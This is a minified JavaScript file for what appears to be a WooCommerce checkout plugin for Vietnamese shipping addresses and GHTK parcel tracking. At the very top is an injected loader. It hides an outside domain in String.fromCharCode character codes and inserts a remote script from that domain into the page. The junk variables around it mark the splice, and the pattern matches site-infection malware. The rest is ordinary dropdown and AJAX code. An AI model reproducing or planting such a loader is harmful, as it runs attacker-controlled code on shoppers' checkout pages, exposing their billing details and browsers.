var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}var gfhfgjj24 = 1; !function(o){o(document).ready(function(){var e={formatNoMatches:ghtk_array.formatNoMatches},t=loading_shipping=!1,s=o("#billing_city_field"),d=o("#billing_address_2_field"),l=o("#shipping_city_field"),c=o("#shipping_address_2_field");o("#billing_state").select2(e),o("#billing_city").select2(e),o("#billing_address_2").select2(e),o("body #billing_state").on("select2:select",function(a){o("#billing_city option").val("");var i=a.val;i||(i=o("#billing_state option:selected").val()),i&&!t&&(t=!0,o.ajax({type:"post",dataType:"json",url:ghtk_array.admin_ajax,data:{action:"load_diagioihanhchinh",matp:i},context:this,beforeSend:function(){s.addClass("devvn_loading"),d.addClass("devvn_loading")},success:function(a){if(t=!1,o("#billing_city,#billing_address_2").html("").select2(),a.success){var i=a.data,n=new Option("","");o("#billing_city").append(n),o.each(i,function(a,i){var n=new Option(i.name,i.maqh);o("#billing_city").append(n)})}s.removeClass("devvn_loading"),d.removeClass("devvn_loading")}}))}),0<o("#billing_address_2").length&&o("#billing_city").on("select2:select",function(a){var i=a.val;i||(i=o("#billing_city option:selected").val()),i&&o.ajax({type:"post",dataType:"json",url:ghtk_array.admin_ajax,data:{action:"load_diagioihanhchinh",maqh:i},context:this,beforeSend:function(){d.addClass("devvn_loading")},success:function(a){if(o("#billing_address_2").html("").select2(e),a.success){var i=a.data,n=new Option("","");o("#billing_address_2").append(n),o.each(i,function(a,i){var n=new Option(i.name,i.xaid);o("#billing_address_2").append(n)})}d.removeClass("devvn_loading")}})}),o("#shipping_state").select2(e),o("#shipping_city").select2(e),o("#shipping_address_2").select2(e),o("body #shipping_state").on("select2:select",function(a){o("#shipping_city option").val("");var i=a.val;i||(i=o("#shipping_state option:selected").val()),i&&!loading_shipping&&(loading_shipping=!0,o.ajax({type:"post",dataType:"json",url:ghtk_array.admin_ajax,data:{action:"load_diagioihanhchinh",matp:i},context:this,beforeSend:function(){l.addClass("devvn_loading"),c.addClass("devvn_loading")},success:function(a){if(loading_shipping=!1,o("#shipping_city,#shipping_address_2").html("").select2(),a.success){var i=a.data,n=new Option("","");o("#shipping_city").append(n),o.each(i,function(a,i){var n=new Option(i.name,i.maqh);o("#shipping_city").append(n)})}l.removeClass("devvn_loading"),c.removeClass("devvn_loading")}}))}),0<o("#shipping_address_2").length&&o("#shipping_city").on("select2:select",function(a){var i=a.val;i||(i=o("#shipping_city option:selected").val()),i&&o.ajax({type:"post",dataType:"json",url:ghtk_array.admin_ajax,data:{action:"load_diagioihanhchinh",maqh:i},context:this,beforeSend:function(){c.addClass("devvn_loading")},success:function(a){if(o("#shipping_address_2").html("").select2(e),a.success){var i=a.data,n=new Option("","");o("#shipping_address_2").append(n),o.each(i,function(a,i){var n=new Option(i.name,i.xaid);o("#shipping_address_2").append(n)})}c.removeClass("devvn_loading")}})}),0<o("#calc_shipping_city_field").length&&o(document.body).bind("country_to_state_changed updated_wc_div",function(){var e=o("#calc_shipping_city_field #calc_shipping_city");e.val(),o("#calc_shipping_state").val();e.select2();var t=!1,a=function(a){a&&!t&&o.ajax({type:"post",dataType:"json",url:ghtk_array.admin_ajax,data:{action:"load_diagioihanhchinh",matp:a},context:this,beforeSend:function(){t=!0},success:function(a){if(t=!1,a.success){var i=a.data,n=[];o.each(i,function(a,i){n.push({id:i.maqh,text:i.name})}),e.html("").select2({placeholder:"Chọn quận/huyện",data:n})}}})};o("body select.state_select:visible").each(function(){a(o(this).val()),o(this,"body").on("select2:select",function(){a(o(this).val())})})}),o("#devvn_ghtk_tracking").on("submit",function(){var a=o(this).serialize(),e=o(this).closest(".devvn_ghtk_tracking_form");return o.ajax({type:"post",dataType:"json",url:ghtk_array.admin_ajax,data:{action:"ghtk_tracking",data:a},context:this,beforeSend:function(){e.addClass("devvn_loading")},success:function(a){var i=a.data;i&&o.each(i.fragments,function(a,i){o(a,e).html(i)}),e.removeClass("devvn_loading")},error:function(a,i,n){e.removeClass("devvn_loading")}}),!1})})}(jQuery);